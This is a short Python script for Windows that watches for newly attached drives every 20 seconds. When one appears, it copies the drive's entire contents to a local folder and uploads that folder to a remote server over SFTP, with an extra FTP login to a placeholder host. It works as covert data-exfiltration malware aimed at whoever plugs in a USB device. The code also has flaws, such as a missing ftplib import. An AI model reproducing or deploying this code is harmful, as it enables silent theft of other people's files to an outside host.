import win32api
from time import sleep
import shutil
import pysftp
drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
discos = len(drives)
discosp = len(drives)
while True:
    sleep(20)
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    discos = len(drives)
    if discos > discosp:
        directorio = drives[-1]
        src = directorio
        dest = "C:\Documentos"
        destination = shutil.copytree(src, dest)
        session = ftplib.FTP('server.address.com','USERNAME','PASSWORD')
        srv = pysftp.Connection(host="www.destination.com", username="root", password="password",log="./temp/pysftp.log")
        with srv.cd('home'):
            srv.put_r('C:\Documentos', 'static', preserve_mtime=True)
            srv.close()
    discosp = len(drives)
    

